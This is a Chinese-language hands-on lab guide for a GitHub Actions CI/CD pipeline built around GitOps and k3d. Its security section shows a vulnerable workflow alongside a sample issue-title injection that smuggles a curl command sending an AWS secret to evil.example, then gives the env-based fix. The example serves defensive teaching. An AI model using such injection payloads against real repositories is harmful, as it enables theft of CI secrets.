# 🧪 GitHub Actions CI/CD 融会贯通大实验 · 操作合集

> 一条**贴近生产**的 CI/CD 一条龙：代码 push → GitHub Actions 跑测试 → 打**可追溯镜像**推 GHCR
> → **只改一个独立 GitOps 配置仓库**（不碰集群）→ 自建 runner 连本机 k3d **只读冒烟验证**
> → prod **人工审批门** → 再冒烟验证 → 可复用 workflow 报告结果。做完能有面试实力。
> 环境：**Windows 11 Home 用 WSL2 + k3d**（跟 Jenkins 大实验同一套底座）。
> 代码/脚本都在 `labs/github-actions/`，本页只列**操作**；括号里是对应的 KodeKloud 课程章节。
> 目标应用：`app/`（dasher-svc，Node/Express 外卖订单服务）。

**⚠️ 先读这段再动手**：这门课的 CD 职责边界 = 只改 GitOps 仓库的 Git，绝不 `kubectl apply`。
真正把新版本同步进集群是 `labs/argocd/` 大实验的活。这个大实验做到"GitOps 仓库改对了 tag、
自建 runner 冒烟验证通过"就算完整闭环；没装 ArgoCD 之前，`verify-dev`/`verify-prod` 会因为
集群里还没有对应 Deployment 而 curl 失败——这是预期的，等 ArgoCD 大实验接上去才会真正绿。
详见 `README.md` 里的"跨仓库契约"。

## 0 · 起环境 (Types of Runners / Installing a Self-Hosted Runner)

- 一次性：Windows PowerShell(管理员) 跑 `wsl --install`（装过 Jenkins 大实验的可跳过）
- Ubuntu 里进 `labs/github-actions/runner/wsl2-k3d/` 跑 `bash setup.sh`
  - 装好：docker + k3d(集群名 `gitops`，映射 dev:30081/prod:30082) + kubectl + node
  - 顺便把 GitHub Actions runner 官方二进制下载到 `actions-runner/`（还没注册，见第 7 步）
- 自检：`kubectl get nodes`、`kubectl get ns`（能看到 `dasher-dev`/`dasher-prod`）
- 详细见 `runner/wsl2-k3d/README.md`

## 1 · 建一个独立仓库 (Introduction / Create-Explore-GitHub-Account)

- GitHub Actions 的 workflow 必须放在**仓库真实根目录**的 `.github/workflows/`，不像 Jenkins
  能在 UI 里指定 Script Path 去子目录找——所以要新建一个 GitHub 仓库（比如 `dasher-svc`），
  把 `labs/github-actions/` 目录下的所有文件（含隐藏的 `.github/`）当作**该仓库的根目录**推上去
- `git init && git add -A && git commit -m "init dasher-svc" && git remote add origin <你的新仓库> && git push -u origin main`

## 2 · 仓库级 Secrets + 权限 (Working-with-Repository-Level-Secrets)

- Settings → Actions → General → Workflow permissions：确认 "Read and write permissions"
  开着（`build-push` job 要用内置 `GITHUB_TOKEN` 推 GHCR，需要 `packages: write`）
- Settings → Secrets and variables → Actions → New repository secret，加两个：
  - `GITOPS_REPO`：你的 GitOps 配置仓库，`owner/repo` 格式（先随便建一个空仓库占位也行，
    第 6 步会详细讲它该长什么样，或者直接用 ArgoCD 大实验准备好的模板仓库）
  - `GITOPS_PAT`：一个有该仓库 push 权限的 Personal Access Token（跨仓库 `GITHUB_TOKEN` 不够用）

## 3 · 第一条 workflow：跑测试 (Workflow-Configure-Unit-Testing / Using-a-matrix-for-your-jobs)

- push 后打开 Actions 标签页，看 `dasher-svc CI/CD` 跑起来，`test` job 应该有 **node 18 / node 20**
  两条并行的腿（`Using-a-matrix-for-your-jobs` + `Additional-Matrix-Configuration` 两课）
- 看 `test` job 的 Summary，node20 那条腿会多一个 artifact `dasher-svc-test-log`
  （`Storing-workflow-data-as-artifacts` 一课）——点开下载看看内容

## 4 · 构建镜像推 GHCR (Workflow-Docker-Login / Workflow-Docker-Build-and-Test / Workflow-Login-and-Push-to-GHCR)

- `build-push` job 变绿后，去仓库主页右侧 **Packages** 看有没有出现 `dasher-svc` 镜像
- 记下这次的 tag（形如 `12-a1b2c3d`）——job Summary 或者 `docker login` 后 `docker pull` 都能验证

## 5 · Environments：建 dev / prod (Understand-Github-Environments / Create-Dev-Environment-Secrets-Environment-Rules / Create-Prod-Environment-Secrets-Environment-Rules)

- Settings → Environments → New environment，建两个：`dev`、`prod`
- `dev` **不加任何保护规则**——workflow 里 `bump-gitops-dev` job 引用 `environment: dev`，
  没规则就是直通，体会"引用 environment 不等于一定要审批"
- `prod` 勾上 **Required reviewers**，把自己加进去（最多 6 人，一个人点头就放行）
  ——**这一步纯手动，脚本做不到**，workflow 文件里只能声明 `environment: prod`，
  真正的"要不要卡审批"是仓库设置决定的

## 6 · 准备 GitOps 配置仓库 (对应 CD 整体理解 Understand-Deployment-Usecase)

- 直接复用 ArgoCD 大实验准备好的模板：`labs/argocd/gitops-repo/`（结构见下），推成一个独立仓库即可。
  ```
  overlays/dev/kustomization.yaml
  overlays/prod/kustomization.yaml
  ```
  每个 `kustomization.yaml` 里要有：
  ```yaml
  images:
    - name: ghcr.io/<OWNER>/dasher-svc   # 注意：是完整镜像地址，不是短名 dasher-svc
      newTag: "0-0000000"                 # 占位 tag
  ```
- **⚠️ 实测踩过的坑**：`name:` 字段必须跟 `ci-cd.yml` 传给 composite action 的
  `image-name`（= `ghcr.io/${{ github.repository_owner }}/dasher-svc`，真实 owner）
  逐字一致——`labs/argocd/gitops-repo/` 模板里默认写的是字面量占位符 `OWNER`，
  **必须手动改成你真实的 GitHub 用户名/组织名**（`base/deployment.yaml` 的 `image:`
  字段和两个 `overlays/*/kustomization.yaml` 的 `images[].name` 都要改，三处逐字一致）。
  忘记替换的话，yq 的 `select(.name == ...)` 匹配不到任何元素，`newTag` 静默不更新、
  commit 也不会产生（`git diff --cached` 是空的）——**没有任何报错**，`verify-dev`
  会一直卡在"线上版本对不上"，排查时最先查这个。本地已用 yq 手工复现过这个失败模式
  和修复后的成功模式（把 `name:` 从字面量 `OWNER` 换成真实 owner 后 select 才生效）。
- 这就是本实验流水线唯一会写入的地方——`GITOPS_REPO` secret 指向它

## 7 · 自定义 composite action (Custom-Actions 全章)

- `.github/actions/bump-gitops-tag/action.yml` 就是这门课的 composite action 实操：
  `checkout` 别的仓库 → 装 `yq` → 改 `kustomization.yaml` → `commit` + `push`
- 对照读一遍 `Metadata-syntax-for-GitHub-Actions`（inputs/outputs/runs.using）和
  `Create-a-Composite-Action`，理解为什么这里选 composite 而不是 Docker/JS action
- 想直观看到它被调用：Actions 里点开一次 `bump-gitops-dev` job，展开步骤能看到
  `Bump GitOps Image Tag` 这个复合动作把 checkout/装yq/改文件/push 几步都摊开显示

## 8 · 自建 Runner 接入本机 k3d (Self-Hosted-Runner 全章)

- 按 `runner/wsl2-k3d/README.md` 走完注册：仓库 Settings → Actions → Runners → New self-hosted
  runner，复制 token，回 WSL 跑 `./config.sh ... --labels wsl2-k3d`，再 `sudo ./svc.sh install && start`
- 确认 Runners 页面状态变 **Online**，标签里能看到 `wsl2-k3d`
- **强调一遍边界**：`verify-dev`/`verify-prod` 这两个 job 里只有 `curl`，**没有 kubectl**——
  自建 runner 是拿来验证部署结果的，不是拿来做部署的。这个设计本身就是安全考点：
  给自建 runner kubectl 权限，等于给了一台"随时可能跑陌生 workflow 代码"的机器改集群的能力，
  生产上是要极力避免的

## 9 · 打通全链路 (Continuous-Deployment 全章 + If-Expressions-and-Pull-Request + workflow-dispatch-Input-Options)

- 装完 ArgoCD（另一个大实验）并让它盯上第 6 步的 GitOps 仓库后，重新触发一次
  `workflow_dispatch`（Actions 页面手动 Run workflow），观察：
  1. `bump-gitops-dev` 改完 GitOps 仓库的 dev overlay 就绿了（不用等审批，`dev` environment 无保护规则）
  2. `verify-dev` 在自建 runner 上跑，等 ArgoCD 同步完，`curl :30081/api/version` 断言 tag 对上
  3. `promote-prod` 卡住，Actions 页面出现 **Review deployments** 按钮，点 Approve 才继续
     （这就是 Continuous Delivery 的"人工审批门"；如果 `dev` 那种直通到底，就是 Continuous Deployment）
  4. 批准后 `promote-prod` 改 prod overlay，`verify-prod` 在自建 runner 上验证 `:30082`
- 还没配好 ArgoCD、只想验证 dev 这段闭环：手动 Run workflow 时把 `skip_prod` 填 `true`，
  流水线会在 `verify-dev` 之后就停，不去碰 prod environment（`workflow-dispatch-Input-Options` 一课）

## 10 · 可复用 workflow 报告结果 (Reusable-Workflows-and-Reporting 全章)

- 不管前面哪个 job 红没红，最后 `report` job 都会跑（`if: always()`），调用
  `.github/workflows/notify-slack.yml`（`workflow_call` + `with:` 传参，`Step-1~4` 系列课）
- 想看到真的 Slack 消息：照 `Slack-Notify-GitHub-Action` 一课建个 Incoming Webhook，
  存成仓库级 secret `SLACK_WEBHOOK_URL`；没配也没关系，`notify-slack.yml` 会自动退化成打日志，
  不会让整条流水线因为没配 Slack 就跑不通——这个"optional secret + 优雅降级"的写法本身就值得记住

## 11 · 安全加固 (Security-Guide 全章)

- **CodeQL**：`.github/workflows/security.yml` push/PR 到 main 都会跑，另外每周四兜底跑一次；
  跑完去仓库 **Security → Code scanning** 标签页看有没有告警（对应 `Use-CodeQL-as-a-step-in-a-workflow`）
- **Script Injection 攻防（只讲文字，不在仓库放真漏洞文件）**：

  假设要写一个"读 issue 标题、判断是不是 bug"的 workflow，**危险写法**是把 `${{ }}`
  表达式直接拼进 `run:` 的 shell 脚本里：

  ```yaml
  # ❌ 危险：untrusted 输入直接拼进 shell
  steps:
    - name: Add a Label
      env:
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      run: |
        issue_title="${{ github.event.issue.title }}"
        if [[ "$issue_title" == *"bug"* ]]; then
          echo "bug!"
        fi
  ```

  攻击者只要把 issue 标题起成：

  ```
  bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://evil.example/dump
  ```

  GitHub 在渲染 `run:` 之前会先把 `${{ github.event.issue.title }}` 原样替换进 YAML 文本，
  于是 shell 实际执行的是 `issue_title="bug"; curl ...`——多出来的 `curl` 命令直接执行，
  能把 `$AWS_SECRET_ACCESS_KEY` 偷走。

  **修复写法**：把不可信输入放进 `env:`，shell 里用 `$issue_title` 变量引用它，
  而不是让 `${{ }}` 直接出现在 `run:` 脚本正文里：

  ```yaml
  # ✅ 安全：untrusted 输入经 env 变量中转，永远只是一个字符串值
  steps:
    - name: Add a Label
      env:
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        issue_title: ${{ github.event.issue.title }}
      run: |
        if [[ "$issue_title" == *"bug"* ]]; then
          echo "bug!"
        fi
  ```

  原理：`${{ }}` 表达式只在**拼 YAML 文本**这一步被替换，`env:` 里的值是作为环境变量传给
  shell 进程的，shell 不会对环境变量的内容再"解析成命令"去执行，所以再怎么构造 `"; curl ...`
  也只是一段普通字符串。`.github/actions/bump-gitops-tag/action.yml` 里用 yq 的 `strenv()`
  而不是把 `${{ inputs.tag }}` 直接拼进 yq 表达式字符串，就是同一个道理的实际应用——
  可以对照着读一遍。

- **最小权限**：`ci-cd.yml` workflow 级只给 `contents: read`，`packages: write` /
  `security-events: write` 都下放到具体需要的 job 上（`Security-hardening-for-GitHub-Actions` 一课）
- **Action Pinning**（进阶，本实验用的都是官方/知名 action 的 major 版本 tag 如 `@v4`，
  更严格的生产环境会钉到 commit SHA，防止上游 tag 被劫持后偷偷变更行为）

## 12 · 收工

- `bash runner/wsl2-k3d/teardown.sh`（只停自建 runner，**默认保留**共享的 k3d 集群 `gitops`，
  因为 ArgoCD 大实验可能还要用；两个实验都做完了再加 `--with-cluster` 彻底清场）
- 去 GitHub 仓库 Settings → Actions → Runners 手动 Remove 掉注册记录（脚本做不到这步）

---

## 🚀 进阶（面试加分，做完基础版再挑着来）

- **Action Pinning 到 commit SHA**：把 `actions/checkout@v4` 这类换成 `actions/checkout@<40位sha>`，
  体会"tag 可变、SHA 不可变"这个供应链安全的核心区别（`Third-Party-Review` 相关）。
- **组织级共享 workflow / 模板**：把 `notify-slack.yml` 挪到一个单独的 `.github` 仓库，
  跨多个项目仓库复用（`Organizations-Templated-workflow` 一课）。
- **HashiCorp Vault 存密钥**：`GITOPS_PAT` 这类长期有效的凭据，生产里更常见的做法是走
  Vault 动态签发短时效 token，而不是存成永久 repo secret（`Securing-Secrets-using-HashiCorp-Vault`）。
- **Wait Timer**：给 `prod` environment 加一个等待窗口（比如 10 分钟冷静期），
  跟 Required reviewers 叠加使用。
- **组织级自建 runner + 分组**：把 runner 从仓库级挪到组织级，用 `Managing-self-hosted-runners-using-groups`
  控制哪些仓库能用哪些 runner（企业多团队场景）。

## 🎯 做完这个实验，你面试能讲什么

- **GitOps 而非直接部署的 CD 设计**：CI 流水线只改 Git（GitOps 配置仓库），
  从不直接 `kubectl apply`；部署入口唯一、可审计，ArgoCD 负责把 Git 状态同步进集群
- **自建 Runner 的正确用法边界**：只做部署后只读校验，不给它写权限——避免"能跑陌生代码的机器
  同时又有集群写权限"这个典型供应链风险
- **可追溯制品**：镜像 tag = run_number + Git 短 SHA，杜绝 `:latest` 漂移
- **Environments 分层审批**：dev 无保护规则直通（Continuous Deployment）、
  prod 配 Required reviewers（Continuous Delivery），同一套 workflow 逻辑两种模式
- **Composite Action + Reusable Workflow**：把重复逻辑（改 GitOps tag / 上报结果）
  收敛成可复用单元，而不是到处复制粘贴 YAML
- **CI/CD 安全加固**：Script Injection 攻防（`env:` 间接引用 vs 直接拼进 `run:`）、
  CodeQL 静态扫描、workflow 级最小权限
- **matrix / concurrency / timeout / job outputs / if-expression / artifacts**：
  这门课几乎所有核心语法点，在一条真实链路里全用上了，不是孤立练语法

**一句话简历**：设计并落地了一条 GitHub Actions CI/CD 流水线，坚持 GitOps 部署边界
（CI 只改配置仓库、不直接操作集群），用自建 Runner 做跨内外网的部署后校验，
Environments 分层实现 dev 自动直通 / prod 人工审批，配合 Composite Action 和 Reusable
Workflow 消除重复逻辑，并落地 CodeQL 扫描与脚本注入防护等安全加固。

**验收**：push 后 test(两个 node 版本) → build-push → GitOps dev overlay 被自动改 tag 并
（配合 ArgoCD 后）冒烟验证通过；手动 Approve 后 prod overlay 同样被改、冒烟通过；
不管成败流水线末尾都产出一次结果报告；`security.yml` 能在 Security 标签页看到 CodeQL 结果；
全程搜不到任何一处 `kubectl apply`/`kubectl set image`。
